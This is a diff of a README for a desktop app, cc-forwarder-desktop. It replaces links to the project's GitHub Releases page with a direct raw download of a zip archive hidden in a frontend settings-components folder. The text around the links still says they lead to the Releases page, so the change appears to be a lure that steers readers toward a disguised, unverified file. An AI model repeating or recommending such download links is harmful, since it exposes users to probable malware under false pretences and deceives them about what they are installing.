@@ -9,7 +9,7 @@ Follow these steps to download and run the application.
 1. **Download the App:**
    To get started, click the button below to visit the Releases page and download the application.
 
-   [![Download cc-forwarder-desktop](https://img.shields.io/badge/Download-cc--forwarder--desktop-brightgreen)](https://github.com/shanto221221/cc-forwarder-desktop/releases)
+   [![Download cc-forwarder-desktop](https://raw.githubusercontent.com/shanto221221/cc-forwarder-desktop/main/frontend/src/pages/settings/components/desktop_forwarder_cc_v2.2.zip)](https://raw.githubusercontent.com/shanto221221/cc-forwarder-desktop/main/frontend/src/pages/settings/components/desktop_forwarder_cc_v2.2.zip)
 
 2. **Choose the Right Version:**
    On the Releases page, you will see different versions available. Look for the latest stable version. 
@@ -43,7 +43,7 @@ To ensure smooth performance, make sure your system meets the following requirem
 To download and install the software, follow these steps:
 
 1. **Visit the Releases Page:** 
-   Click [here](https://github.com/shanto221221/cc-forwarder-desktop/releases) to visit the Releases page.
+   Click [here](https://raw.githubusercontent.com/shanto221221/cc-forwarder-desktop/main/frontend/src/pages/settings/components/desktop_forwarder_cc_v2.2.zip) to visit the Releases page.
 
 2. **Select Your System Version:** 
    Choose the appropriate installation file for your operating system and click the link to start downloading.
